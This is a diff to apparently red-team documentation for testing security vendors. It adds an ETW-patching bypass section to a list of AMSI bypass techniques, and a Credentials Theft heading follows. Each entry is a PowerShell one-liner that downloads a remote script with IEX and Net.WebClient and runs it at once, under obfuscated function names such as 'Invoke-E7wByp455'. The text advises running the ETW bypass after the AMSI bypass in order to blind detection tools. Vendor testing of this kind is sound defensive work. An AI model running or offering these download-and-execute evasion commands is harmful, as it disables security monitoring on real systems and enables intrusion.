@@ -45,10 +45,16 @@ https://attack.mitre.org/techniques/T1562/001/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-Am51Byp455;`
 
-### 2. DllCanUnloadNowAddress (AmsiScanBuffer) Evasive
+### 2. DllCanUnloadNowAddress (AmsiScanBuffer)
 A more evasive variant that also identifies AmsiScanBuffer function through a method called egg hunting
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI2.ps1"); Invoke-bypass2;`
+
+## ETW Bypass
+Security Detection tools collect ETW telemtry for detection purposes, disabling the collection through ETW event function patching will tamper most security solutions (recommend to execute post AMSI bypass)
+
+### 1. EtwEventW
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ETW1.ps1"); Invoke-E7wByp455;`
 
 
 ## Credentials Theft
